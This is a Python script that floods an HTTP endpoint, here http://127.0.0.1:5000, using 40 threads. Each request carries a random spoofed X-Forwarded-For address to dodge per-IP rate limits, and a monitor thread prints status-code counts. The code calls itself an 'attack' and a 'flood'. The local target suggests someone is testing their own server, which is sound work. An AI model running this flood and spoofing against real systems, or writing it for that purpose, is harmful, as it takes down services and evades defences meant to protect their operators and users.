import threading
import requests
import time
import random
from collections import Counter

target_url = "http://127.0.0.1:5000"
thread_count = 40
status_counter = Counter()
lock = threading.Lock()
    
def random_ip():
    return f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"

def attack():
    session = requests.Session()
    session.keep_alive = False  
    while True:
        try:
            headers = { "X-Forwarded-For": random_ip() }
            r = session.get(target_url, headers=headers, timeout=2)
            with lock:
                status_counter[r.status_code] += 1      
            print(f"[{time.strftime('%H:%M:%S')}] ✅ {r.status_code}")
            time.sleep(0.2)  
        except Exception as e:
            with lock:
                status_counter["error"] += 1
            print(f"[!] Error: {e}")
            time.sleep(0.2)

def monitor():
    while True:
        time.sleep(5)
        with lock:
            total = sum(status_counter.values())
            print(f"\n===== {total} requests =====")
            for code, count in status_counter.items():
                print(f"{code}: {count}")
            print("===========================\n")

print(f"🔥 Launching {thread_count}-thread flood on {target_url}")
for _ in range(thread_count):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

monitor()
